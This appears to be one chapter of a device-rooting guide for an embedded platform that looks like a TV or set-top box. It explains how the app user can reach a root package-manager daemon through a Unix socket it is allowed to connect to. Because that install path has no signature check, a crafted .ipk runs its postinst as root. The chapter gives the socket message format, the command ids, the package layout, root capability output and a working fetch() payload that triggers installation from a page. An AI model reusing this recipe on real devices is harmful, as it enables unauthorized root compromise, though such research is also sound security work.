# 03 — root

The escalation does not touch a vendor file. It uses the package manager's
privileged helper, reached through a Unix socket that the app user is allowed to
connect to.

## Why it works

`services/pkgmgr/PackageInstall.js` does not run `opkg` itself:

```js
const cmd = `${sessionId};${ipk};${allFields.Package};${options}`;
sendMsgToSuperwatch(cmd, "82", sessionId);
```

`services/pkgmgr/SuperwatchCtrl.js` writes a 4-byte little-endian length followed
by `<sessionId>:<commandId>:<message>` to:

```
/var/run/superwatch_socket      srw-rw---- root 616
```

**616 is one of the supplementary groups of uid 314**, so the app context may
connect directly. The daemon runs `opkg install` as root, which means the
package's `postinst` runs as root.

Measured result of a test package:

```
POSTINST_RAN
Uid:    0   0   0   0
Gid:    0   0   0   0
CapEff: 000001ffffffffff
```

Full capabilities, including `CAP_SYS_ADMIN`, `CAP_MKNOD`, `CAP_NET_ADMIN` and
`CAP_SETUID`.

## Command ids

| id | action |
|---|---|
| 80 / 81 | backup / restore |
| 82 | install |
| 83 | uninstall |
| 84 | rollback |
| 85 | directory size |

Response format is `<sessionId>:<code>`; `0` = OK, `604` = invalid command id,
`-1` = generic failure.

## Message format for install

```
<session>:82:<session>;<absolute ipk path>;<package name>;<options>
```

**Options must be empty.** With `--tmp-dir,/OAD/pkgs/tmp` the daemon answered
`-1`; with an empty option field it answered `0`.

There is no signature check on this path. `checkIpkSignature` is only used by the
store-update flow.

## Package layout

Standard `ar` archive:

```
debian-binary     "2.0\n"
control.tar.gz    ./control  ./postinst
data.tar.gz       ./APPS/...
```

`control` needs at least `Package`, `Version`, `Architecture: mtk9655`,
`AppId`, `AppName`. `postinst` is `0755`.

**opkg extracts `data.tar.gz` relative to `/APPS/pkgs`, not to `/`.** A member
`./APPS/.re_sshd/file` lands at `/APPS/pkgs/APPS/.re_sshd/file`; move it from
the `postinst` if it belongs elsewhere.

## Minimal example

```sh
# 1. build the ipk on the host
# 2. push it to a writable path (see 02-write-and-exec.md)
# 3. ask the daemon to install it
```

```js
// inside the page, through the FaaS helper
fetch("https://localhost:9888/function/system/fetch/sw2", {method:"POST", body:
  JSON.stringify({list:["42:82:42;/APPS/installer.ipk;re.installer;"]})})
```

Installing the same package twice does not re-run `postinst`. Send `83`
(uninstall) first, then `82` — that is what the trigger script in
[`04-ssh.md`](04-ssh.md) does.

## Cleanup

`83` removes the package and its data files, but not things the `postinst`
created outside the package's data list. Track what you create.
